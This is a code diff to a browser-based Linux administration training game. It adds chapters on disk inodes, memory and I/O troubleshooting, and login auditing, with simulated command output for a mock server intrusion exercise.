@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#0f141c">
-<meta name="description" content="Learn Linux administration by fixing a broken server - 30 chapters in a simulated terminal.">
+<meta name="description" content="Learn Linux administration by fixing a broken server - 35 chapters in a simulated terminal.">
 <meta name="mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
@@ -30,6 +30,7 @@
   color-scheme:dark;
 }
 html,body{height:100%}
+[hidden]{display:none!important}
 body{background:var(--bg);color:var(--ink);font-family:var(--f-body);font-size:15px;line-height:1.55}
 .app{height:100%;display:grid;grid-template-rows:auto minmax(0,1fr)}
 .top{display:flex;align-items:center;justify-content:space-between;gap:12px 20px;flex-wrap:wrap;padding-block:12px;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));border-bottom:1px solid var(--line);background:var(--panel)}
@@ -49,6 +50,14 @@ button{font:inherit;cursor:pointer}
 .btn.primary{background:var(--amber);color:var(--on-amber);border-color:var(--amber)}
 .btn.danger{border-color:var(--red);color:var(--red)}
 .btn:disabled{opacity:.45;cursor:not-allowed}
+.btn.on{background:color-mix(in srgb,var(--amber) 22%,var(--raise));border-color:var(--amber);color:var(--amber)}
+.stat .v.live{color:var(--amber)}
+#speed .label{margin-bottom:8px}
+.spd-row{display:flex;justify-content:space-between;gap:10px;font-size:13px;padding:3px 0;border-bottom:1px solid var(--line)}
+.spd-row:last-child{border-bottom:0}
+.spd-row .sv{font-family:var(--f-mono);font-variant-numeric:tabular-nums;color:var(--ink)}
+.spd-live{font-family:var(--f-display);font-weight:600;font-size:22px;color:var(--amber);font-variant-numeric:tabular-nums}
+.spd-hint{font-size:12px;color:var(--muted);margin-top:6px}
 .btn:focus-visible,.chip:focus-visible,.key:focus-visible{outline:2px solid var(--amber);outline-offset:2px}
 
 .stage{display:grid;grid-template-columns:minmax(290px,370px) minmax(0,1fr);gap:16px;min-height:0;padding-block:16px;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px))}
@@ -126,12 +135,14 @@ code{font-family:var(--f-mono);font-size:.88em;background:var(--term);border:1px
       <span class="mark" aria-hidden="true"></span>
       <div>
         <div class="name">The Last Sysadmin</div>
-        <div class="sub">Learn Linux administration by fixing a broken server · Chapters 1–30</div>
+        <div class="sub">Learn Linux administration by fixing a broken server · Chapters 1–35</div>
       </div>
     </div>
     <div class="stats">
       <div class="stat"><span class="k">XP</span><span class="v" id="xp">0</span></div>
       <div class="stat"><span class="k">Rank</span><span class="v" id="rank">Intern</span></div>
+      <div class="stat" id="clockStat" hidden><span class="k">Task time</span><span class="v live" id="clock">0:00</span></div>
+      <button class="btn" id="btnTimer" type="button" title="Time each ticket and keep a performance log">Speed tracker</button>
       <button class="btn" id="btnNew" type="button">New game</button>
     </div>
   </header>
@@ -160,6 +171,10 @@ code{font-family:var(--f-mono);font-size:.88em;background:var(--term);border:1px
       <div>
         <div class="label">Rack status <span id="doneCount"></span></div>
         <div class="leds" id="leds"></div>
+      </div>
+      <div id="speed" hidden>
+        <div class="label">Speed tracker <span id="spdCount"></span></div>
+        <div id="speedBody"></div>
       </div>
       <div>
         <div class="label">Commands you've used <span>tap one to read its manual</span></div>
@@ -489,7 +504,7 @@ function jmHome() {
     '.ssh': D({ authorized_keys: F(JM_KEYS, { owner: 'jmorrow', mode: 0o600, mtime: at(2026, 3, 2, 10, 4) }) }, { owner: 'jmorrow', mode: 0o700, mtime: at(2026, 3, 2, 10, 4) })
   }, { owner: 'jmorrow', mode: 0o750, mtime: at(2026, 10, 21, 22, 19) });
 }
-const GAME_CMDS = ['hint', 'submit', 'retry', 'mission', 'help', 'check'];
+const GAME_CMDS = ['hint', 'submit', 'retry', 'mission', 'help', 'check', 'stats', 'tracker'];
 function buildFS() {
   const bins = {};
   for (const c of Object.keys(CMDS).filter(c => !GAME_CMDS.includes(c))) {
@@ -511,7 +526,8 @@ function buildFS() {
       fstab: F(FSTAB),
       ssh: D({ sshd_config: F(SSHD, { mode: 0o644 }) }),
       systemd: D({ system: D({}) }),
-      'logrotate.d': D({})
+      'logrotate.d': D({}),
+      'cron.d': D({})
     }),
     mnt: D({}),
     home: D({
@@ -563,7 +579,7 @@ function buildFS() {
     }, { mode: 0o1777, mtime: at(2026, 10, 22, 2, 51) }),
     usr: D({ bin: D(bins), share: D({}) }),
     var: D({
-      lib: D({ halcyon: D({}, { owner: 'halcyon', mode: 0o750 }) }),
+      lib: D({ halcyon: D({}, { owner: 'halcyon', mode: 0o750 }), php: D({ sessions: phpSessions() }) }),
       log: D({
         'syslog.1': F('Oct 23 03:12:44 halcyon-web01 systemd[1]: Started daily apt upgrade and clean activities.\nOct 23 06:25:01 halcyon-web01 CRON[20233]: (root) CMD (test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily)\n', { owner: 'syslog', group: 'adm', mode: 0o640, mtime: at(2026, 10, 23, 23, 59) }),
         'auth.log': F(AUTHLOG, { owner: 'syslog', group: 'adm', mode: 0o640, mtime: at(2026, 10, 25, 8, 52) }),
@@ -605,6 +621,11 @@ function initDisks() {
     ] },
     { name: 'vdc', size: '20G', type: 'disk', children: [] }
   ];
+}
+function phpSessions() {
+  const c = {}; const old = at(2026, 9, 20, 2, 0);
+  for (let i = 0; i < 8; i++) c['sess_' + simpleHash('s' + i, 26)] = F('session|a:0:{}', { owner: 'www-data', mtime: old });
+  return D(c, { owner: 'www-data', mode: 0o733 });
 }
 function initSysctl() { return { 'net.ipv4.ip_forward': '0', 'kernel.hostname': 'halcyon-web01', 'vm.swappiness': '60', 'net.ipv4.conf.all.rp_filter': '2', 'kernel.pid_max': '4194304', 'fs.file-max': '9223372036854775807' }; }
 function initLvm() { return { pvs: [], vgs: [], lvs: [] }; }
@@ -687,7 +708,7 @@ function reviveProc(name) {
   return { pid: s.mainpid, user: name === 'halcyon' ? 'halcyon' : 'root', cpu: 1.0, mem: 3.0, vsz: 900000, rss: 150000, tty: '?', stat: 'Ssl', start: '09:15', time: '0:00', cmd: s.exec };
 }
 function freshState() {
-  return { v: 1, mig: 7, sudo: false, vars: {}, units: {}, daemonReloaded: false, images: initImages(), containers: initContainers(), repo: initRepo(), procs: initProcs(), disks: initDisks(), mounts: initMounts(), packages: initPackages(), aptUpdated: false, services: initServices(), crontabs: initCrontabs(), firewall: { active: false, rules: [] }, net: initNet(), journal: initJournal(), curledLocal: false, sysctl: initSysctl(), lvm: initLvm(), dns: initDns(), aliases: initAliases(), umask: 18, fs: buildFS(), cwd: HOME, oldpwd: HOME, mission: 0, xp: 0, hints: {}, done: [], learned: [], history: [], readM: [], cmdsM: [], nudged: [], checkpoint: null, finished: false, lastStatus: 0 };
+  return { v: 1, mig: 8, sudo: false, vars: {}, units: {}, daemonReloaded: false, images: initImages(), containers: initContainers(), repo: initRepo(), procs: initProcs(), disks: initDisks(), mounts: initMounts(), packages: initPackages(), aptUpdated: false, services: initServices(), crontabs: initCrontabs(), firewall: { active: false, rules: [] }, net: initNet(), journal: initJournal(), curledLocal: false, tracker: false, times: [], missionStart: null, held: 0, heldPid: null, inodeBad: false, oom: null, iowait: false, compromise: false, intruderIp: INTRUDER_IP, sysctl: initSysctl(), lvm: initLvm(), dns: initDns(), aliases: initAliases(), umask: 18, fs: buildFS(), cwd: HOME, oldpwd: HOME, mission: 0, xp: 0, hints: {}, done: [], learned: [], history: [], readM: [], cmdsM: [], nudged: [], checkpoint: null, finished: false, lastStatus: 0 };
 }
 function migrate() {
   if ((S.mig || 1) < 2) {
@@ -740,6 +761,12 @@ function migrate() {
     const ub = getNode('/usr/bin');
     if (ub) for (const c of ['passwd', 'sudo', 'mount']) if (ub.children[c]) ub.children[c].mode = 0o4755;
     S.mig = 7;
+  }
+  if ((S.mig || 1) < 8) {
+    S.held = 0; S.heldPid = null; S.inodeBad = false; S.oom = null; S.iowait = false; S.compromise = false; S.intruderIp = INTRUDER_IP;
+    const etc = getNode('/etc'); if (etc && !etc.children['cron.d']) etc.children['cron.d'] = D({});
+    const lib = getNode('/var/lib'); if (lib && !lib.children.php) lib.children.php = D({ sessions: phpSessions() });
+    S.mig = 8;
   }
 }
 function save() { try { localStorage.setItem(KEY, JSON.stringify(S)); } catch (e) { /* storage unavailable: progress lasts for this visit only */ } }
@@ -1792,6 +1819,20 @@ CMDS.find = (a, ctx) => {
         tests.push(n => { if (n.type !== 'file') return false; const sz = Math.ceil(sizeOf(n) / unit); return m[1] === '+' ? sz > N : m[1] === '-' ? sz < N : sz === N; });
         break;
       }
+      case '-mtime': case '-atime': case '-ctime': {
+        const v = need(); const m = v.match(/^([+-]?)(\d+)$/);
+        if (!m) throw new Error(`invalid argument \`${v}' to \`${p}'`);
+        const N = +m[2], sign = m[1];
+        tests.push(n => { const age = Math.floor((Date.now() - (n.mtime || Date.now())) / 86400000); return sign === '+' ? age > N : sign === '-' ? age < N : age === N; });
+        break;
+      }
+      case '-mmin': {
+        const v = need(); const m = v.match(/^([+-]?)(\d+)$/);
+        if (!m) throw new Error(`invalid argument \`${v}' to \`-mmin'`);
+        const N = +m[2], sign = m[1];
+        tests.push(n => { const age = Math.floor((Date.now() - (n.mtime || Date.now())) / 60000); return sign === '+' ? age > N : sign === '-' ? age < N : age === N; });
+        break;
+      }
       case '-user': { const v = need(); tests.push(n => n.owner === v); break; }
       case '-perm': { const v = need(); if (v[0] === '-') { const w = parseInt(v.slice(1), 8); tests.push(n => (n.mode & w) === w); } else if (v[0] === '/' || v[0] === '+') { const w = parseInt(v.slice(1), 8); tests.push(n => (n.mode & w) !== 0); } else { const w = parseInt(v, 8); tests.push(n => (n.mode & 0o7777) === w); } break; }
       case '-maxdepth': maxdepth = parseInt(need(), 10); break;
@@ -1826,6 +1867,7 @@ CMDS.find = (a, ctx) => {
       if (!canWrite(m.abs)) { ctx.err(`find: cannot delete '${m.disp}': Permission denied\n`); st = 1; continue; }
       if (m.node.type === 'dir' && Object.keys(m.node.children).length) { ctx.err(`find: cannot delete '${m.disp}': Directory not empty\n`); st = 1; continue; }
       const par = getNode(parentOf(m.abs)); if (par) delete par.children[baseName(m.abs)];
+      if (m.abs.startsWith('/var/lib/php/sessions/')) S.inodeBad = false;
     }
   } else {
     for (const m of matches) {
@@ -2138,6 +2180,14 @@ CMDS.awk = (a, ctx) => {
 };
 
 CMDS.du = (a, ctx) => {
+  if (a.includes('--inodes')) {
+    const dir = a.filter(x => !x.startsWith('-'))[0] || '.';
+    const big = S.inodeBad ? 1048221 : 142;
+    ctx.out(`${String(S.inodeBad ? 12 : 12).padStart(8)}\t/var/lib/php\n`);
+    ctx.out(`${String(big).padStart(8)}\t/var/lib/php/sessions\n`);
+    ctx.out(`${String(1104).padStart(8)}\t/var/lib\n`);
+    return 0;
+  }
   const { f, rest } = opts(a, 'sha', '', 'du');
   const tg = rest.length ? rest : ['.'];
   const fmt = n => f.h ? human(n) : String(Math.ceil(n / 1024));
@@ -2160,19 +2210,28 @@ CMDS.du = (a, ctx) => {
 };
 const DISK_TOTAL = 25 * GB, DISK_BASE = 17.5 * GB;
 CMDS.df = (a, ctx) => {
-  const { f } = opts(a, 'hT', '', 'df');
-  const used = Math.min(DISK_TOTAL, DISK_BASE + treeSize(S.fs)), avail = DISK_TOTAL - used;
-  const fm = n => f.h ? human(n) : String(Math.round(n / 1024));
-  const rows = [
-    ['Filesystem', f.h ? 'Size' : '1K-blocks', 'Used', 'Avail', 'Use%', 'Mounted on'],
-    ['/dev/vda1', fm(DISK_TOTAL), fm(used), fm(avail), Math.ceil(used / DISK_TOTAL * 100) + '%', '/']
-  ];
-  for (const m of S.mounts) {
-    if (m.mp === '/') continue;
-    const u = m.mp === '/boot' ? 120 * MB : 24 * MB;
-    rows.push([m.dev, fm(m.size), fm(u), fm(m.size - u), Math.ceil(u / m.size * 100) + '%', m.mp]);
+  const { f } = opts(a, 'hTi', '', 'df');
+  let rows;
+  if (f.i) {
+    const tot = 1638400, usedI = S.inodeBad ? 1638398 : 243110;
+    rows = [['Filesystem', 'Inodes', 'IUsed', 'IFree', 'IUse%', 'Mounted on'],
+      ['/dev/vda1', String(tot), String(usedI), String(tot - usedI), Math.ceil(usedI / tot * 100) + '%', '/'],
+      ['/dev/vda2', '65536', '320', '65216', '1%', '/boot']];
+    for (const m of S.mounts) { if (m.mp === '/' || m.mp === '/boot') continue; rows.push([m.dev, '1310720', '12', '1310708', '1%', m.mp]); }
+  } else {
+    const used = Math.min(DISK_TOTAL, DISK_BASE + treeSize(S.fs) + (S.held || 0)), avail = DISK_TOTAL - used;
+    const fm = n => f.h ? human(n) : String(Math.round(n / 1024));
+    rows = [
+      ['Filesystem', f.h ? 'Size' : '1K-blocks', 'Used', 'Avail', 'Use%', 'Mounted on'],
+      ['/dev/vda1', fm(DISK_TOTAL), fm(used), fm(avail), Math.ceil(used / DISK_TOTAL * 100) + '%', '/']
+    ];
+    for (const m of S.mounts) {
+      if (m.mp === '/') continue;
+      const u = m.mp === '/boot' ? 120 * MB : 24 * MB;
+      rows.push([m.dev, fm(m.size), fm(u), fm(m.size - u), Math.ceil(u / m.size * 100) + '%', m.mp]);
+    }
+    rows.push(['tmpfs', fm(2 * GB), '0', fm(2 * GB), '0%', '/dev/shm']);
   }
-  rows.push(['tmpfs', fm(2 * GB), '0', fm(2 * GB), '0%', '/dev/shm']);
   const w = [0, 1, 2, 3, 4].map(i => Math.max(...rows.map(r => r[i].length)));
   ctx.out(rows.map(r => [r[0].padEnd(w[0]), ...[1, 2, 3, 4].map(i => r[i].padStart(w[i])), r[5]].join(' ')).join('\n') + '\n');
 };
@@ -2211,6 +2270,8 @@ Game commands
   hint             reveal the next hint for this ticket (costs XP)
   submit ANSWER    answer a question ticket
   check [ITEM]     say why this ticket hasn't advanced; or inspect a file/service
+  tracker          turn the optional speed tracker on or off
+  stats            show your speed-tracker log (times per ticket)
   retry            restore the server to the start of this ticket
   mission          show the current ticket again
   man COMMAND      read the short manual for a command
@@ -2221,6 +2282,8 @@ Tab completes names. Up and Down recall earlier commands.
 };
 CMDS.hint = () => { showHint(); };
 CMDS.mission = () => { announceMission(); };
+CMDS.tracker = () => { toggleTracker(); };
+CMDS.stats = (a, ctx) => { statsLog(ctx); return 0; };
 CMDS.retry = () => { doRetry(); };
 
 const FLAG_DIAG = {
@@ -2325,9 +2388,13 @@ CMDS.top = (a, ctx) => {
   }
   return 0;
 };
+function releaseHeld(pid) {
+  if (S.heldPid && S.heldPid === pid) { S.held = 0; S.heldPid = null; }
+}
 function stopProc(pid) {
   S.procs = S.procs.filter(z => z.pid !== pid);
   for (const k in S.services) if (S.services[k].mainpid === pid) S.services[k].active = false;
+  releaseHeld(pid);
 }
 CMDS.kill = (a, ctx) => {
   const pids = [];
@@ -2419,7 +2486,8 @@ CMDS.systemctl = (a, ctx) => {
     if (!svc) { ctx.err(`Failed to ${sub} ${name}.service: Unit ${name}.service not found.\n`); return 5; }
     if (needRoot(ctx, `Failed to ${sub} ${svc.unit}: Interactive authentication required.`)) return 1;
     if (sub === 'start' || sub === 'restart' || ((sub === 'enable') && now)) { svc.active = true; if (svc.mainpid && !S.procs.find(x => x.pid === svc.mainpid)) S.procs.push(reviveProc(name.replace(/\.(service|timer)$/, ''))); }
-    if (sub === 'restart') { S.restarted = S.restarted || {}; S.restarted[name] = true; }
+    if (sub === 'restart') { S.restarted = S.restarted || {}; S.restarted[name] = true; releaseHeld(svc.mainpid); }
+    if (sub === 'start' && svc.mainpid) releaseHeld(svc.mainpid);
     if (sub === 'stop') stopProc(svc.mainpid);
     if (sub === 'disable' && now) stopProc(svc.mainpid);
     if (sub === 'enable') { svc.enabled = true; ctx.out(`Created symlink /etc/systemd/system/multi-user.target.wants/${svc.unit} -> /lib/systemd/system/${svc.unit}.\n`); }
@@ -2880,7 +2948,7 @@ CMDS.git = (a, ctx) => {
 /* ---------- performance, accounts, integrity (chapters 16-20) ---------- */
 CMDS.uptime = (a, ctx) => {
   const d = new Date(); const high = S.procs.some(x => x.cpu > 100);
-  const la = high ? '4.21, 3.08, 1.74' : '0.09, 0.14, 0.11';
+  const la = S.iowait ? '12.40, 11.90, 8.30' : (high ? '4.21, 3.08, 1.74' : '0.09, 0.14, 0.11');
   ctx.out(`${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} up 6 days,  3:12,  1 user,  load average: ${la}\n`);
   return 0;
 };
@@ -3040,6 +3108,10 @@ CMDS.sysctl = (a, ctx) => {
 };
 CMDS.dmesg = (a, ctx) => {
   const lines = ['[    0.000000] Linux version 6.8.0-45-generic (buildd@lcy02) ', '[    0.210441] Command line: BOOT_IMAGE=/vmlinuz-6.8.0-45-generic root=UUID=7c3f-root ro quiet', '[    1.884302] virtio_net virtio0 eth0: renamed from eth0', '[    2.110554] EXT4-fs (vda1): mounted filesystem with ordered data mode', '[    2.945013] systemd[1]: Detected virtualization kvm.', '[   12.330901] ufw: initialized, default deny', '[  3421.882190] halcyon-worker[812]: started 4 workers'];
+  if (S.oom) lines.push(
+    `[889221.func] halcyon-worker invoked oom-killer: gfp_mask=0x100cca, order=0, oom_score_adj=0`,
+    `[889221.502] Out of memory: Killed process ${S.oom} (halcyon-worker) total-vm:3904012kB, anon-rss:3122440kB, file-rss:0kB`,
+    `[889221.540] oom_reaper: reaped process ${S.oom} (halcyon-worker), now anon-rss:0kB`);
   ctx.out(lines.join('\n') + '\n'); return 0;
 };
 CMDS.lsmod = (a, ctx) => { ctx.out('Module                  Size  Used by\nvirtio_net             57344  0\nvirtio_blk             20480  3\next4                  942080  2\nbr_netfilter           32768  0\noverlay               163840  1\n'); return 0; };
@@ -3112,6 +3184,11 @@ CMDS['mkfs.ext4'] = (a, ctx) => CMDS.mkfs(['-t', 'ext4', ...a], ctx);
 CMDS['mkfs.xfs'] = (a, ctx) => CMDS.mkfs(['-t', 'xfs', ...a], ctx);
 CMDS.blkid = (a, ctx) => { let i = 0; for (const part of allParts()) { if (part.fstype) ctx.out(`/dev/${part.name}: UUID="${simpleHash(part.name, 36).replace(/(.{8})(.{4})(.{4})(.{4})(.{12}).*/, '$1-$2-$3-$4-$5')}" TYPE="${part.fstype}"\n`); } for (const lv of S.lvm.lvs) if (lv.fstype) ctx.out(`${lv.dev}: UUID="${simpleHash(lv.name, 36).replace(/(.{8})(.{4})(.{4})(.{4})(.{12}).*/, '$1-$2-$3-$4-$5')}" TYPE="${lv.fstype}"\n`); return 0; };
 CMDS.lsof = (a, ctx) => {
+  if (a.includes('+L1') || a.includes('+L') ) {
+    ctx.out('COMMAND     PID   USER   FD   TYPE DEVICE  SIZE/OFF NLINK     NODE NAME\n');
+    if (S.held && S.heldPid) ctx.out(`${(S.heldProc || 'proc').padEnd(11)} ${String(S.heldPid).padEnd(5)} ${(S.heldUser || 'root').padEnd(6)} ${(S.heldFd || '4w').padEnd(4)} REG  252,1 ${String(S.held).padStart(10)}     0 ${String(S.heldNode || 918273).padStart(8)} ${S.heldFile || '/var/log/app.log'} (deleted)\n`);
+    return 0;
+  }
   const { f } = opts(a, '', 'i', 'lsof');
   if (f.i !== undefined) { const port = (f.i.match(/:(\d+)/) || [])[1]; const lp = port ? +port : null; ctx.out('COMMAND   PID    USER   FD   TYPE  DEVICE NODE NAME\n'); let any = false; for (const l of S.net.listen) { if (lp && l.lport !== lp) continue; ctx.out(`${(l.proc || '-').slice(0, 9).padEnd(9)} ${String(l.pid || '-').padEnd(6)} ${(S.procs.find(p => p.pid === l.pid) || {}).user || 'root'}    ${String(3).padEnd(4)} IPv4   0  TCP *:${l.lport} (LISTEN)\n`); any = true; } return any ? 0 : 1; }
   const t = a.filter(x => !x.startsWith('-'))[0];
@@ -3122,8 +3199,8 @@ CMDS.lsof = (a, ctx) => {
 CMDS.timeout = (a, ctx) => { const rest = a.filter((x, i) => i > 0 || /^\d+/.test(x) ? true : false); let i = 0; if (/^\d+/.test(a[0])) i = 1; const dur = a[0]; const argv = a.slice(i); if (!argv.length) { ctx.err('timeout: usage: timeout DURATION COMMAND [ARG]...\n'); return 1; } return exec(argv, ctx); };
 CMDS.nohup = (a, ctx) => { const argv = a.filter(x => x !== '&'); if (!argv.length) { ctx.err('nohup: usage: nohup COMMAND [ARG]...\n'); return 1; } ctx.out("nohup: ignoring input and appending output to 'nohup.out'\n"); const r = exec(argv, ctx); return r; };
 CMDS.jobs = (a, ctx) => { return 0; };
-CMDS.vmstat = (a, ctx) => { const busy = S.procs.some(p => p.cpu > 100); ctx.out('procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----\n r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n'); ctx.out(` ${busy ? 3 : 1}  0      0 ${busy ? '612000' : '1840000'}  61200 1920800    0    0    12    40  220  410 ${busy ? '96  2  2' : ' 3  1 96'}  0  0\n`); return 0; };
-CMDS.iostat = (a, ctx) => { ctx.out('Linux 6.8.0-45-generic (halcyon-web01)\n\navg-cpu:  %user   %nice %system %iowait  %steal   %idle\n          ' + (S.procs.some(p => p.cpu > 100) ? '95.80    0.00    2.10    0.40    0.00    1.70' : '3.10    0.00    1.00    0.20    0.00   95.70') + '\n\nDevice             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn\nvda1             12.40       180.20        95.30    2104332    1203110\n'); return 0; };
+CMDS.vmstat = (a, ctx) => { const busy = S.procs.some(p => p.cpu > 100); const io = S.iowait; ctx.out('procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----\n r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n'); ctx.out(` ${io ? '1  5' : (busy ? '3  0' : '1  0')}      0 ${busy ? '612000' : '1840000'}  61200 1920800    0    0 ${io ? ' 98420   140' : '    12    40'}  ${io ? '1820 2900' : ' 220  410'} ${io ? ' 4  3  9 84' : (busy ? '96  2  2  0' : ' 3  1 96  0')}  0\n`); return 0; };
+CMDS.iostat = (a, ctx) => { const io = S.iowait; ctx.out('Linux 6.8.0-45-generic (halcyon-web01)\n\navg-cpu:  %user   %nice %system %iowait  %steal   %idle\n          ' + (io ? ' 4.10    0.00    2.80   84.30    0.00    8.80' : (S.procs.some(p => p.cpu > 100) ? '95.80    0.00    2.10    0.40    0.00    1.70' : '3.10    0.00    1.00    0.20    0.00   95.70')) + '\n\nDevice             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn\nvda1          ' + (io ? '1842.60     98420.00       140.20  812034110    1203110' : '  12.40       180.20        95.30    2104332    1203110') + '\n'); return 0; };
 CMDS.watch = (a, ctx) => { const idx = a.findIndex(x => !x.startsWith('-') && !/^\d+$/.test(x) && a[a.indexOf(x) - 1] !== '-n'); const argv = a.slice(idx < 0 ? 1 : idx).filter(x => x !== '-n' && !/^\d+$/.test(x) || true); const cmd = a.filter((x, i) => !(x === '-n' || (a[i - 1] === '-n'))); const run = cmd.filter(x => !x.startsWith('-') || x.length > 2); if (!run.length) { ctx.err('watch: no command to run\n'); return 1; } ctx.out(`Every 2.0s: ${run.join(' ')}\n\n`); return exec(run, ctx); };
 CMDS.make = (a, ctx) => {
   const dryRun = a.includes('-n'); const targets = a.filter(x => !x.startsWith('-'));
@@ -3140,6 +3217,50 @@ CMDS.make = (a, ctx) => {
     if (!rules[tg]) { ctx.err(`make: *** No rule to make target '${tg}'.  Stop.\n`); return 2; }
     for (const line of rules[tg]) { const show = line.replace(/^@/, ''); if (!line.startsWith('@')) ctx.out(show + '\n'); if (!dryRun) { runLine(show); if (S.lastStatus !== 0) { ctx.err(`make: *** [${tg}] Error ${S.lastStatus}\n`); return 2; } } else if (dryRun && line.startsWith('@')) ctx.out(show + '\n'); }
   }
+  return 0;
+};
+
+
+/* ---------- login auditing & incident forensics (chapters 31-35) ---------- */
+const INTRUDER_IP = '198.51.100.66';
+function uid0Intruders() { return splitLines(getNode('/etc/passwd').content).map(l => l.split(':')).filter(f => f[2] === '0' && f[0] !== 'root' && /sh$/.test(f[6] || '')).map(f => f[0]); }
+function loginRows() {
+  const rows = [
+    { user: 'rookie', tty: 'pts/0', from: '10.0.4.57', login: 'Wed 09:14', dur: 'still logged in' },
+    { user: 'rookie', tty: 'pts/0', from: '10.0.4.57', login: 'Tue 08:52 - 11:06', dur: '(02:14)' },
+    { user: 'dana', tty: 'pts/1', from: '10.0.4.31', login: 'Oct 22 17:58 - 18:01', dur: '(00:03)' }
+  ];
+  if (S.compromise) rows.unshift({ user: 'support', tty: 'pts/2', from: S.intruderIp || INTRUDER_IP, login: 'Mon 03:11', dur: 'still logged in' });
+  return rows;
+}
+CMDS.last = (a, ctx) => {
+  const num = (() => { const m = a.find(x => /^-\d+$/.test(x)); return m ? parseInt(m.slice(1), 10) : 99; })();
+  const rows = loginRows().slice(0, num);
+  for (const r of rows) ctx.out(`${r.user.padEnd(8)} ${r.tty.padEnd(8)} ${r.from.padEnd(15)} ${r.login.padEnd(18)} ${r.dur}\n`);
+  ctx.out('\nwtmp begins Thu Oct 22 17:58:03 2026\n');
+  return 0;
+};
+CMDS.lastb = (a, ctx) => {
+  if (needRoot(ctx, 'lastb: /var/log/btmp: Permission denied')) return 1;
+  const fails = [['admin', '203.0.113.9'], ['test', '203.0.113.140'], ['oracle', '192.0.2.55'], ['ubuntu', '203.0.113.9'], ['postgres', '192.0.2.55']];
+  if (S.compromise) fails.unshift(['root', S.intruderIp || INTRUDER_IP]);
+  for (const [u, ip] of fails) ctx.out(`${u.padEnd(8)} ssh:notty    ${ip.padEnd(15)} ${'Mon 03:0' + Math.floor(Math.random() * 9)}    (00:00)\n`);
+  ctx.out('\nbtmp begins Mon Oct 26 00:00:01 2026\n');
+  return 0;
+};
+CMDS.w = (a, ctx) => {
+  const d = new Date();
+  const sessions = [{ user: 'rookie', tty: 'pts/0', from: '10.0.4.57', at: '09:14', idle: '0.00s', what: 'w' }];
+  for (const u of uid0Intruders()) sessions.push({ user: u, tty: 'pts/2', from: S.intruderIp || INTRUDER_IP, at: '03:11', idle: '2:14', what: `/tmp/.cache/kdevtmpfsi` });
+  const high = S.iowait || S.procs.some(p => p.cpu > 100);
+  ctx.out(` ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} up 6 days,  3:20,  ${sessions.length} user${sessions.length > 1 ? 's' : ''},  load average: ${high ? '11.90, 9.40, 6.10' : '0.09, 0.14, 0.11'}\n`);
+  ctx.out('USER     TTY      FROM             LOGIN@   IDLE   WHAT\n');
+  for (const x of sessions) ctx.out(`${x.user.padEnd(8)} ${x.tty.padEnd(8)} ${x.from.padEnd(16)} ${x.at.padEnd(8)} ${x.idle.padEnd(6)} ${x.what}\n`);
+  return 0;
+};
+CMDS.who = (a, ctx) => {
+  ctx.out('rookie   pts/0        2026-10-28 09:14 (10.0.4.57)\n');
+  for (const u of uid0Intruders()) ctx.out(`${u.padEnd(8) } pts/2        2026-10-26 03:11 (${S.intruderIp || INTRUDER_IP})\n`);
   return 0;
 };
 
@@ -3161,7 +3282,7 @@ const MAN = {
   rm: ['remove files or directories', 'rm [OPTION]... FILE...', [['-r', 'remove directories and everything inside them'], ['-f', 'ignore missing files'], ['-v', 'print each removed file']], ['rm old.txt', 'rm -r old-folder'], 'There is no recycle bin on a server. Deleted means gone. (In this game, retry restores the start of the ticket.)'],
   cp: ['copy files and directories', 'cp [OPTION]... SOURCE... DEST', [['-r', 'copy directories recursively'], ['-v', 'print each copy made']], ['cp app.log app.log.bak', 'cp /etc/hosts ~/', 'cp -r configs ~/backup/']],
   mv: ['move or rename files', 'mv [OPTION]... SOURCE... DEST', [['-v', 'print each move made']], ['mv draft.txt final.txt', 'mv script.sh ~/quarantine/'], 'If DEST is an existing folder, the file moves into it. Otherwise the file is renamed to DEST.'],
-  find: ['search for files in a directory tree', 'find [PATH]... [EXPRESSION]', [['-name PATTERN', 'match the file name (quote patterns: \'*.log\')'], ['-iname PATTERN', 'like -name, ignoring case'], ['-type f|d', 'only files (f) or directories (d)'], ['-size [+|-]N[ckMG]', 'larger (+) or smaller (-) than N bytes, KiB, MiB or GiB'], ['-user NAME', 'owned by NAME'], ['-maxdepth N', 'descend at most N levels'], ['-delete', 'delete every match (check the list first!)'], ['-exec CMD {} \\;', 'run CMD on each match; {} is replaced by the path']], ["find /tmp -name '*.core'", 'find / -size +1G', "find . -type f -name '*.txt' -exec wc -l {} \\;"]],
+  find: ['search for files in a directory tree', 'find [PATH]... [EXPRESSION]', [['-name PATTERN', 'match the file name (quote patterns: \'*.log\')'], ['-iname PATTERN', 'like -name, ignoring case'], ['-type f|d', 'only files (f) or directories (d)'], ['-size [+|-]N[ckMG]', 'larger (+) or smaller (-) than N bytes, KiB, MiB or GiB'], ['-mtime [+|-]N', 'modified more than (+N) or less than (-N) N days ago'], ['-mmin [+|-]N', 'modified N minutes ago (same +/- rule)'], ['-user NAME', 'owned by NAME'], ['-maxdepth N', 'descend at most N levels'], ['-delete', 'delete every match (check the list first!)'], ['-exec CMD {} \\;', 'run CMD on each match; {} is replaced by the path']], ["find /tmp -name '*.core'", 'find / -size +1G', "find . -type f -name '*.txt' -exec wc -l {} \\;"]],
